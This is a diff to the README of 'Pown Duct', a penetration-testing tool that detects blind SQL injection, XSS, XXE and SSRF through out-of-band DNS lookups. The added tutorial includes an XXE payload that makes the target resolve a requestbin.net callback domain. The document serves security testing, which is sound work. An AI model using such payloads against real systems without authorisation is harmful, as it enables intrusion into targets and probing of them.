@@ -4,7 +4,7 @@
 
 # Pown Duct
 
-Esential tool for finding blind injection attacks.
+Essential tool for finding blind injection attacks.
 
 ## Credits
 
@@ -17,6 +17,8 @@ This tool is part of [secapps.com](https://secapps.com) open-source initiative.
  |___/___\___/_/ \_\_| |_|  |___/
   https://secapps.com
 ```
+
+> **NB**: This tool is taking advantage of requestbin.net service. Future versions will use a dedicated, custom-built infrastructure.
 
 ## Quickstart
 
@@ -78,5 +80,32 @@ Options:
   --version  Show version number  [boolean]
   --help     Show help  [boolean]
   --channel  Restore channel  [string]
-  --output   Output format  [string] [default: "string"]
+  --output   Output format  [string] [choices: "string", "hexdump", "json"] [default: "string"]
 ```
+
+## Tutorial
+
+There are cases when we need to perform an attack such as sql injection, XSS, XXE or SSRF but the target application is not providing any indication that it is vulnerable. One way to be sure if vulnerable is to try to inject a valid attack vector which forces a DNS resolver to ask for an attack controlled domain. If the resolution is successful, the attack will be considered successful.
+
+> **NOTE**: You might be familiar with Burp Collaborator which provides a similar service for profesional usage.
+
+First, we need a disposable dns name to resolve:
+
+```sh
+$ pown duct dns
+```
+
+Using the provided DNS, compose your payload. For example, the following could trigger trigger DNS resolution if XXE vulnerability is present.
+
+```xml
+<!DOCTYPE foo [
+<!ELEMENT foo ANY>
+<!ENTITY bar SYSTEM
+"http://showmethemoney.f92839570333a5d62743.d.requestbin.net">
+]>
+<foo>
+&bar;
+</foo>
+```
+
+If the attack was successful, we will get a message in the terminal.
